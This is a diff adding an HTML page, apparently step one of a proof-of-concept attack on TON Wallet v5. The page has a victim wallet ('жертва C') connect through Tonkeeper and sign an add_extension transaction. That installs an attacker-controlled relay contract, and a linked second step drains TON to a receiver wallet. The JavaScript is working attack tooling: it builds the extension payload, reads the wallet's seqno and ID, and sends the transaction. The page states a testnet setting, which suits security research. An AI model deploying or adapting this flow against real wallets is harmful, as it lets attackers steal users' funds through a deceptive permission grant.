@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>W5 — Install extension (Tonkeeper)</title>
+  <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 520px; margin: 2rem auto; padding: 0 1rem; }
+    code { background: #eee; padding: 2px 6px; border-radius: 4px; word-break: break-all; }
+    button { margin: 0.5rem 0.5rem 0.5rem 0; padding: 0.6rem 1rem; cursor: pointer; }
+    .warn { background: #fff3cd; padding: 0.75rem; border-radius: 8px; margin: 1rem 0; }
+    .err { color: #b00020; }
+    label { display: block; margin-top: 0.75rem; }
+  </style>
+</head>
+<body>
+  <h1>Install extension (жертва C)</h1>
+  <p>Один раз через <strong>Tonkeeper</strong>: Connect → Confirm → <code>add_extension</code>.</p>
+
+  <div class="warn">
+    Testnet + Wallet <strong>v5</strong>. Relay из <code>config.json</code> (после <code>npm run deploy</code>).
+  </div>
+
+  <p>Network: <strong id="net">…</strong></p>
+  <p>Victim (C): <code id="victim">…</code> — Connect <strong>этим</strong> кошельком</p>
+  <p>Relay: <code id="relay">…</code></p>
+  <p>Receiver (B): <code id="recv">…</code></p>
+  <p>Drain: <strong id="drain">…</strong> TON</p>
+
+  <div id="ton-connect"></div>
+
+  <label>
+    Payload mode
+    <select id="mode">
+      <option value="unsigned">unsigned external (recommended)</option>
+      <option value="inner">inner actions only</option>
+    </select>
+  </label>
+
+  <button id="install" disabled>Install extension in Tonkeeper</button>
+  <p id="status"></p>
+  <p><a href="index.html">→ Step 2: trigger drain</a></p>
+
+  <script type="module">
+    import { beginCell, Address, toNano } from "https://esm.sh/@ton/core@0.60.0";
+    import {
+      packAddExtensionPayload,
+      packUnsignedExternalInstall,
+    } from "./js/w5-actions.js";
+    import { fetchWalletSeqno, fetchSubwalletId } from "./js/tonapi.js";
+
+    const statusEl = document.getElementById("status");
+    const setStatus = (t, err = false) => {
+      statusEl.textContent = t;
+      statusEl.className = err ? "err" : "";
+    };
+
+    let config = null;
+    try {
+      const r = await fetch("./config.json");
+      config = await r.json();
+    } catch {
+      setStatus("Создай public/config.json из config.example.json (relay после deploy)", true);
+    }
+
+    if (config) {
+      document.getElementById("net").textContent = config.network || "testnet";
+      document.getElementById("victim").textContent = config.walletA || "—";
+      document.getElementById("relay").textContent = config.relayAddress || "—";
+      document.getElementById("recv").textContent = config.walletB || "—";
+      document.getElementById("drain").textContent = config.drainAmount || "0.1";
+    }
+
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+      manifestUrl: new URL("./tonconnect-manifest.json", window.location.href).toString(),
+      buttonRootId: "ton-connect",
+    });
+
+    const installBtn = document.getElementById("install");
+
+    tonConnectUI.onStatusChange((w) => {
+      installBtn.disabled = !w || !config?.relayAddress;
+    });
+
+    async function getMeta(userAddress) {
+      const network = config.network || "testnet";
+      try {
+        const q = new URLSearchParams({ address: userAddress, network });
+        const proxy = await fetch(`/api/wallet-meta?${q}`);
+        if (proxy.ok) return proxy.json();
+      } catch { /* local without vercel */ }
+      const seqno = await fetchWalletSeqno(network, userAddress);
+      const walletId = await fetchSubwalletId(network, userAddress);
+      return { seqno, walletId };
+    }
+
+    installBtn.onclick = async () => {
+      if (!config?.relayAddress) {
+        setStatus("config.json: relayAddress", true);
+        return;
+      }
+
+      const wallet = tonConnectUI.wallet;
+      if (!wallet) {
+        setStatus("Сначала Connect", true);
+        return;
+      }
+
+      const userAddress = wallet.account.address;
+      if (config.walletA) {
+        try {
+          const same = Address.parse(userAddress).equals(Address.parse(config.walletA));
+          if (!same) {
+            setStatus("Connect кошельком C (walletA из config), иначе relay не совпадёт", true);
+            return;
+          }
+        } catch { /* parse later */ }
+      }
+      const relay = Address.parse(config.relayAddress);
+      const mode = document.getElementById("mode").value;
+
+      setStatus("Читаю seqno / wallet_id…");
+      let seqno, walletId;
+      try {
+        ({ seqno, walletId } = await getMeta(userAddress));
+      } catch (e) {
+        setStatus(String(e.message || e), true);
+        return;
+      }
+
+      const validUntil = Math.floor(Date.now() / 1000) + 600;
+      let payloadCell;
+
+      if (mode === "inner") {
+        payloadCell = packAddExtensionPayload(beginCell, relay);
+      } else {
+        payloadCell = packUnsignedExternalInstall(beginCell, {
+          walletId,
+          validUntil,
+          seqno,
+          relayAddress: relay,
+        });
+      }
+
+      setStatus("Открой Tonkeeper и проверь warning Add extension…");
+
+      try {
+        await tonConnectUI.sendTransaction({
+          validUntil,
+          messages: [
+            {
+              address: userAddress,
+              amount: toNano("0.05").toString(),
+              payload: payloadCell.toBoc().toString("base64"),
+            },
+          ],
+        });
+        setStatus("Отправлено. Проверь get_extensions на Tonviewer, потом Step 2.");
+      } catch (e) {
+        setStatus(e?.message || "Rejected", true);
+      }
+    };
+  </script>
+</body>
+</html>
